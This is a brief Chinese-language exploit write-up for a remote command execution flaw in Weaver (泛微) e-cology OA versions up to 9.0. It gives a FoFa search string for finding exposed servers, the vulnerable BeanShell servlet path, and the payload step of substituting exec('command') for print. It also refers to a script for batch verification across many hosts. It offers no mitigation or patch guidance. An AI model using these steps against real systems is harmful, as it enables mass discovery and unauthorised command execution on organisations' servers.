# 影响范围：
泛微OA<=9.0
# FoFa Dork
"Set-Cookie: ecology_JSessionId"
# 漏洞复现：
登录页面：
![image](images/login.png)
访问漏洞地址
```/weaver/bsh.servlet.BshServlet```  
![image](images/servlet.png)
将```print```替换为```exec('command')```,evaluate。
![image](images/print.png)
返回结果：  
![image](images/exec.png) 
使用脚本批量验证：    
![image](images/script.png)  